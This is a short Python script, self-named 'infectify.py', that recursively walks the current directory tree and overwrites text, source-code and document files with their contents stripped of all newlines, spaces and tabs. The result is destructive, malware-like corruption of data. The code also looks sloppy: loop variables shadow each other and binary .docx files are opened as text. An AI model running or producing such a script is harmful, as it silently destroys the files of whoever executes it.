import os

files = os.listdir(os.getcwd())
subdirectories = [x[0] for x in os.walk(os.getcwd())]

extensions = [".txt", ".cpp", ".cs", ".c", ".in", ".out", ".doc", ".docx", ".py"]
inputfile = ""

def modify_files(myPath):
    os.chdir(myPath)
    files = os.listdir(myPath)
    for i in range(len(files)):
        for j in range(len(extensions)):
            if extensions[j] in files[i]:
                inputfile = open(files[i], "r")
                data = inputfile.read()
                inputfile.close()
                if(os.path.isfile(files[i])):
                    if(files[i] != "infectify.py"):
                        outputfile = open(files[i], "w")         
                        step = data.split("\n")
                        data = ""
                        for i in range(len(step)):
                            data += step[i]
                        step = data.split(" ")
                        data = ""
                        for i in range(len(step)):
                            data += step[i]
                        step = data.split("\t")
                        data = ""
                        for i in range(len(step)):
                            data += step[i]
                        outputfile.write(data)
                        outputfile.close()                

for directory in subdirectories:
    modify_files(directory)